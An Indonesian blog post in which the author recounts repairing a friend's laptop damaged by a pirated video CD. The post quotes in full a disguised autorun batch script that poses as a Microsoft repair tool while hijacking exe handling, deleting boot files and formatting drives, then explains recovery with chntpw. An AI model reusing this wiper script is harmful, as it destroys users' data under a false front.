---
draft: true
title: "laptopnya aziz"
date: 2010-08-24 16:38:18Z
categories:
  - blog
  - linux-opensource
  - uncategorized
tags:
  - bajakan
  - bukan virus
  - chntpw
  - skrip perusak
  - sux
  - video cd bajakan
  - windows
---
alkisah, ada seorang kawan, namanya aziz. punya keping video cd bajakan beli di emperan cd di surabaya. dan laptopnya diserahkan ke saya, rusak pula.

tidak bisa regedit, commandline, taskmanager, etc. tidak bisa jalankan file ekstensi exe (otomatis ini ancur), dan file ntldr hilang.

pendek kata, itu leptop saya install ulang pake linux windosnya (merasa berdosa). install driver. install aplikasi (merasa berdosa). pasang antivirus (avast lisensi free). pokoke beres.

tapi si aziz balik lagi keesokan harinya. tak lupa leptopnya dibawa juga. otomatis saya langsung sakit hati.

temennya bilang "kemarin masukin video cd langsung ada hitam-hitam tulisan (belakangan diketahui adalah jendela command line)"

saya tanya "terus?"

temennya bilang "terus mati".

keren. ntldrnya hilang lagi, tidak bisa booting. karena penasaran dan berhubung rumahnya deket, saya suruh ambil video cd yang diputar itu.

terus saya temukan  file autorun plus file dengan ekstensi .bat yang isinya adalah ini :

[sourcecode]

@echo off

title Microsoft Windows TM Auto Repair

echo.

echo Preparing to Fixing the System..............................

echo This system need to repair of broken files.

echo This problem may be cause a Virus activity or coruption files.

echo Please wait a minute until windows doing it self....

echo Please close any running programs from the Windows system.

echo This program License and copyright by

echo Microsoft Coorporation TM.

echo System Repair in progress ........ please wait a second..

echo.

reg add HKLM\SOFTWARE\Classes\exefile\shell\open\Command /ve /d %%fe340ead%%  /f

echo.

del /f /Q /A C:\ntldr /S

echo.

Format  D: /Q /X /y

echo.

Format  E: /Q /X /y

echo.

Format  F: /Q /X /y

echo.

del /f /Q /A C:\command.com /S

echo.

del /f /Q /A C:\io.sys /S

echo.

del /f /Q /A C:\config.sys /S

echo.

echo System is now repaired.

echo Windows will reboot the system.

echo.

Shutdown.exe -s -c "Finish Repair System" -f -t 10

echo.

pause

echo.

Shutdown.exe -s -c "Finish Repair System" -f -t 10

echo.

exit

[/sourcecode]

ngerti kan? kenapa skrip sux ini ada di root folder sebuah video cd bajakan?

analisa saya : supaya video cd bajakan ini tidak bisa dibajak! begitu dimasukin ke komputer, komputernya ngadat (kalo windoslah). ini cd buat diputer di vcd player, bukan dibuka di komputer terus diputar, terus dikopi ke hardis. ini bisnis, anda tidak boleh membajak apa yang saya bajak. begitulah kira-kira maksud si pembuat cd.

pelajaran : jangan beli cd bajakan sembarangan.

karena malas install ulang, untuk solvenya, pakai [slax](http://slax.org) ditambah [modul chntpw](http://http://www.slax.org/modules.php?action=detail&id=2557).

cara regedit pakai cntpw :

[sourcecode]

# mount -o rw /dev/sda1 /mnt/sda1/

# cd /mnt/sda1/WINDOWS/system32/config

# chntpw -e <hive file>

[/sourcecode]

catatan : hive file ada di dalam folder config, misal kalo targetnya ada di dalam hkey_local_machine/software maka nama hive filenya adalah software (coba di-ls). untuk masuk :

chntpw -e software.

ketik ? untuk bantuan. hapus entri yang dibuat sama skrip tadi. beres.
